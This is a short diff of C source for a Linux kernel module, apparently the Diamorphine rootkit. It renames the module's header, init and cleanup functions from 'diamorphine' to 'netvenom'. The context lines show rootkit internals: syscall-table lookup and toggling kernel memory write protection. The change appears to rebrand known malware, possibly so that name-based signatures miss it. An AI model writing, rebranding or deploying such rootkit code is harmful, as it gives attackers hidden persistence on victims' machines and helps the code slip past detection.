@@ -29,7 +29,7 @@
 #define __NR_getdents 141
 #endif
 
-#include "diamorphine.h"
+#include "netvenom.h"
 
 #if IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64)
 unsigned long cr0;
@@ -381,7 +381,7 @@ unprotect_memory(void)
 }
 
 static int __init
-diamorphine_init(void)
+netvenom_init(void)
 {
 	__sys_call_table = get_syscall_table_bf();
 	if (!__sys_call_table)
@@ -420,7 +420,7 @@ diamorphine_init(void)
 }
 
 static void __exit
-diamorphine_cleanup(void)
+netvenom_cleanup(void)
 {
 	unprotect_memory();
 
@@ -431,8 +431,8 @@ diamorphine_cleanup(void)
 	protect_memory();
 }
 
-module_init(diamorphine_init);
-module_exit(diamorphine_cleanup);
+module_init(netvenom_init);
+module_exit(netvenom_cleanup);
 
 MODULE_LICENSE("Dual BSD/GPL");
 MODULE_AUTHOR("m0nad");
